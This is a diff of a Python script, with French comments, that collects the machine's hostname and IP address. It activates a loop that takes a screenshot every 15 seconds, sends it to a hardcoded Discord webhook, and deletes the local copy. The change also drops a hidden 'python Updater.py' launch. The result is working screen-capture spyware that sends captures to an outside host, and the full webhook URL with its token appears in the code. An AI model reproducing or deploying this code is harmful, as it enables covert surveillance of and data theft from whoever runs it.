@@ -4,7 +4,7 @@ import os
 import time
 import socket
 
-os.system('cmd /c "pip install --upgrade pyautogui && pip install --upgrade pillow && python Updater.py')
+os.system('cmd /c "pip install --upgrade pyautogui && pip install --upgrade pillow')
 
 hostname=socket.gethostname()
 IPAddr=socket.gethostbyname(hostname)
@@ -31,11 +31,9 @@ def send_to_discord(webhook_url, screenshot_path):
 discord_webhook_url = 'https://discord.com/api/webhooks/1174066670596276356/qNzyNuYfnEhmiHZMjH8oi1nwyS-xykqzy9ZnjsP8R6WmTXf_VY808R5XPqI1yjKM5vbB'
 
 
-# while True:
-#     # Prend un screenshot
-#     screenshot_path = take_screenshot()
-#     # Envoie le screenshot au webhook Discord
-#     send_to_discord(discord_webhook_url, screenshot_path)
-#     # Supprime le fichier du screenshot après l'envoi (facultatif)
-#     os.remove(screenshot_path)
-#     time.sleep(15)
+while True:
+    screenshot_path = take_screenshot()
+    send_to_discord(discord_webhook_url, screenshot_path)
+    os.remove(screenshot_path)
+    time.sleep(15)
+    print("🛰️")
